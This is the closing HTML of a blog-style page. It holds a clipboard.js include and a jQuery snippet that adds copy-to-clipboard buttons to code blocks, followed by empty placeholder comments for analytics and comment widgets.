    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
